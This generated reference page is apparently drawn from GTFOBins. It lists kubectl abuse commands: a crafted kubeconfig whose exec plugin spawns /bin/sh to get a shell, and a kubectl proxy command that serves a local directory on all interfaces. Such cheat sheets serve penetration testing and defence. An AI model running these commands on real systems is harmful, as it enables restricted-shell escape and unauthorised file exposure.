---
parsed_by: focuslocust
source: commands
type: generated
---
# kubectl Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## kubectl

Tool page: [kubectl](../../tools/linux/kubectl.md)

### shell

```text
cat >/path/to/temp-file <<EOF
clusters:
- cluster:
    server: https://x
  name: x
contexts:
- context:
    cluster: x
    user: x
  name: x
current-context: x
users:
- name: x
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      interactiveMode: Always
      command: /bin/sh
      args:
        - '-c'
        - '/bin/sh 0<&2 1>&2'
EOF

kubectl get pods --kubeconfig=/path/to/temp-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/kubectl` |
| Evidence | Function example preserved from source parser. |

### upload

```text
kubectl proxy --address=0.0.0.0 --port=12345 --www=/path/to/dir/ --www-prefix=/x/
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/kubectl` |
| Evidence | Function example preserved from source parser. |
